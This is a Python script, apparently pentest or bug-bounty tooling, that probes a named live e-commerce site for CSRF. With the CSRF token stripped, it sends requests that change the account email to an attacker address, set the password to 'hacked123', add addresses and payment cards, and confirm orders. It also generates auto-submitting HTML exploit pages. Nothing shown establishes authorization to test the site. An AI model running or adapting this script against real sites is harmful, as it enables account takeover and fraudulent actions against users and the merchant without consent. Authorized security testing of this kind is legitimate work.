#!/usr/bin/env python3
"""
CSRF Testing для Zooplus
Проверяет защиту от CSRF на критичных endpoints
"""

import requests
import json
from datetime import datetime

BASE_URL = "https://www.zooplus.de"


def test_csrf_token_presence(url, method="POST", headers=None, data=None):
    """Проверяет наличие CSRF защиты"""
    
    if headers is None:
        headers = {}
    
    # Remove CSRF token if present
    headers_without_csrf = headers.copy()
    headers_without_csrf.pop('X-CSRF-Token', None)
    headers_without_csrf.pop('X-XSRF-TOKEN', None)
    
    try:
        if method == "POST":
            response = requests.post(url, headers=headers_without_csrf, json=data, timeout=10)
        elif method == "PUT":
            response = requests.put(url, headers=headers_without_csrf, json=data, timeout=10)
        elif method == "DELETE":
            response = requests.delete(url, headers=headers_without_csrf, timeout=10)
        
        # If request succeeds without CSRF token - vulnerability!
        if response.status_code in [200, 201, 204]:
            return {
                "vulnerable": True,
                "url": url,
                "method": method,
                "status": response.status_code
            }
        
        return {"vulnerable": False}
        
    except Exception as e:
        return {"error": str(e)}


def test_profile_update_csrf(session_cookie):
    """Тест CSRF на обновление профиля"""
    print("\n[*] Testing CSRF on profile update...")
    
    if not session_cookie:
        print("[!] No session cookie provided")
        return []
    
    findings = []
    
    url = f"{BASE_URL}/myaccount/api/profile/update"
    headers = {"Cookie": session_cookie, "Content-Type": "application/json"}
    data = {"email": "attacker@evil.com"}
    
    result = test_csrf_token_presence(url, "POST", headers, data)
    
    if result.get("vulnerable"):
        print("[!!!] CSRF VULNERABILITY: Profile update has no CSRF protection!")
        findings.append({
            "type": "CSRF",
            "endpoint": "/myaccount/api/profile/update",
            "description": "Profile update vulnerable to CSRF - attacker can change victim's email",
            "severity": "HIGH",
            "cvss": "6.5"
        })
    else:
        print("[+] Profile update protected against CSRF")
    
    return findings


def test_password_change_csrf(session_cookie):
    """Тест CSRF на смену пароля"""
    print("\n[*] Testing CSRF on password change...")
    
    if not session_cookie:
        print("[!] No session cookie provided")
        return []
    
    findings = []
    
    url = f"{BASE_URL}/myaccount/api/password/change"
    headers = {"Cookie": session_cookie, "Content-Type": "application/json"}
    data = {"newPassword": "hacked123", "currentPassword": ""}
    
    result = test_csrf_token_presence(url, "POST", headers, data)
    
    if result.get("vulnerable"):
        print("[!!!] CRITICAL CSRF: Password change has no CSRF protection!")
        findings.append({
            "type": "CSRF",
            "endpoint": "/myaccount/api/password/change",
            "description": "Password change vulnerable to CSRF - account takeover possible",
            "severity": "CRITICAL",
            "cvss": "8.1"
        })
    else:
        print("[+] Password change protected against CSRF")
    
    return findings


def test_cart_add_csrf(session_cookie):
    """Тест CSRF на добавление в корзину"""
    print("\n[*] Testing CSRF on add to cart...")
    
    if not session_cookie:
        print("[!] No session cookie provided")
        return []
    
    findings = []
    
    url = f"{BASE_URL}/checkout/api/cart/add"
    headers = {"Cookie": session_cookie, "Content-Type": "application/json"}
    data = {"productId": "12345", "quantity": 1}
    
    result = test_csrf_token_presence(url, "POST", headers, data)
    
    if result.get("vulnerable"):
        print("[!!!] CSRF VULNERABILITY: Add to cart has no CSRF protection!")
        findings.append({
            "type": "CSRF",
            "endpoint": "/checkout/api/cart/add",
            "description": "Add to cart vulnerable to CSRF - attacker can add items to victim's cart",
            "severity": "MEDIUM",
            "cvss": "4.3"
        })
    else:
        print("[+] Add to cart protected against CSRF")
    
    return findings


def test_address_add_csrf(session_cookie):
    """Тест CSRF на добавление адреса"""
    print("\n[*] Testing CSRF on address add...")
    
    if not session_cookie:
        print("[!] No session cookie provided")
        return []
    
    findings = []
    
    url = f"{BASE_URL}/myaccount/api/addresses/add"
    headers = {"Cookie": session_cookie, "Content-Type": "application/json"}
    data = {
        "firstName": "Attacker",
        "street": "Evil Street 666",
        "city": "Hacker City",
        "zipCode": "66666",
        "country": "DE"
    }
    
    result = test_csrf_token_presence(url, "POST", headers, data)
    
    if result.get("vulnerable"):
        print("[!!!] CSRF VULNERABILITY: Address add has no CSRF protection!")
        findings.append({
            "type": "CSRF",
            "endpoint": "/myaccount/api/addresses/add",
            "description": "Add address vulnerable to CSRF - attacker can add malicious delivery address",
            "severity": "MEDIUM",
            "cvss": "5.3"
        })
    else:
        print("[+] Address add protected against CSRF")
    
    return findings


def test_payment_add_csrf(session_cookie):
    """Тест CSRF на добавление платежного метода"""
    print("\n[*] Testing CSRF on payment method add...")
    
    if not session_cookie:
        print("[!] No session cookie provided")
        return []
    
    findings = []
    
    url = f"{BASE_URL}/myaccount/api/payment-methods/add"
    headers = {"Cookie": session_cookie, "Content-Type": "application/json"}
    data = {
        "type": "card",
        "cardNumber": "4111111111111111"
    }
    
    result = test_csrf_token_presence(url, "POST", headers, data)
    
    if result.get("vulnerable"):
        print("[!!!] CRITICAL CSRF: Payment method add has no CSRF protection!")
        findings.append({
            "type": "CSRF",
            "endpoint": "/myaccount/api/payment-methods/add",
            "description": "Add payment method vulnerable to CSRF - attacker can add their payment method",
            "severity": "CRITICAL",
            "cvss": "7.5"
        })
    else:
        print("[+] Payment method add protected against CSRF")
    
    return findings


def test_order_confirm_csrf(session_cookie):
    """Тест CSRF на подтверждение заказа"""
    print("\n[*] Testing CSRF on order confirmation...")
    
    if not session_cookie:
        print("[!] No session cookie provided")
        return []
    
    findings = []
    
    url = f"{BASE_URL}/checkout/api/order/confirm"
    headers = {"Cookie": session_cookie, "Content-Type": "application/json"}
    data = {"cartId": "test-cart-123"}
    
    result = test_csrf_token_presence(url, "POST", headers, data)
    
    if result.get("vulnerable"):
        print("[!!!] CRITICAL CSRF: Order confirmation has no CSRF protection!")
        findings.append({
            "type": "CSRF",
            "endpoint": "/checkout/api/order/confirm",
            "description": "Order confirmation vulnerable to CSRF - attacker can force victim to complete purchase",
            "severity": "CRITICAL",
            "cvss": "7.1"
        })
    else:
        print("[+] Order confirmation protected against CSRF")
    
    return findings


def generate_csrf_poc(endpoint, method, data):
    """Генерирует HTML PoC для CSRF"""
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - Zooplus {endpoint}</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>This page demonstrates CSRF vulnerability on {endpoint}</p>
    
    <form id="csrf-form" action="{BASE_URL}{endpoint}" method="{method}">
"""
    
    for key, value in data.items():
        html += f'        <input type="hidden" name="{key}" value="{value}">\n'
    
    html += """        <button type="submit">Click to exploit</button>
    </form>
    
    <script>
        // Auto-submit after 1 second (for demonstration)
        setTimeout(function() {
            document.getElementById('csrf-form').submit();
        }, 1000);
    </script>
</body>
</html>"""
    
    return html


def main():
    print("=" * 60)
    print("Zooplus CSRF Testing")
    print(f"Time: {datetime.now()}")
    print("=" * 60)
    
    all_findings = []
    
    # Need session cookie for authenticated tests
    print("\n[!] For authenticated tests, provide session cookie")
    print("[!] Get it from browser DevTools → Application → Cookies")
    session_cookie = None  # Replace with: "session=YOUR_SESSION_COOKIE"
    
    # Run tests
    findings = test_profile_update_csrf(session_cookie)
    all_findings.extend(findings)
    
    findings = test_password_change_csrf(session_cookie)
    all_findings.extend(findings)
    
    findings = test_cart_add_csrf(session_cookie)
    all_findings.extend(findings)
    
    findings = test_address_add_csrf(session_cookie)
    all_findings.extend(findings)
    
    findings = test_payment_add_csrf(session_cookie)
    all_findings.extend(findings)
    
    findings = test_order_confirm_csrf(session_cookie)
    all_findings.extend(findings)
    
    # Summary
    print("\n" + "=" * 60)
    print("CSRF TEST SUMMARY")
    print("=" * 60)
    
    if all_findings:
        print(f"\n[!!!] Found {len(all_findings)} CSRF vulnerability(ies):\n")
        for i, finding in enumerate(all_findings, 1):
            print(f"{i}. {finding['endpoint']}")
            print(f"   Description: {finding['description']}")
            print(f"   Severity: {finding['severity']} (CVSS: {finding['cvss']})")
            print()
            
            # Generate PoC HTML
            poc_html = generate_csrf_poc(finding['endpoint'], "POST", {})
            poc_filename = f"reports/csrf_poc_{i}.html"
            with open(poc_filename, "w") as f:
                f.write(poc_html)
            print(f"   PoC saved to: {poc_filename}\n")
        
        # Save findings
        with open("reports/csrf_findings.json", "w") as f:
            json.dump(all_findings, f, indent=2)
        print("[+] Findings saved to reports/csrf_findings.json")
        
    else:
        print("\n[+] No CSRF vulnerabilities found")
        print("[+] All critical actions properly protected")
    
    return all_findings


if __name__ == "__main__":
    main()

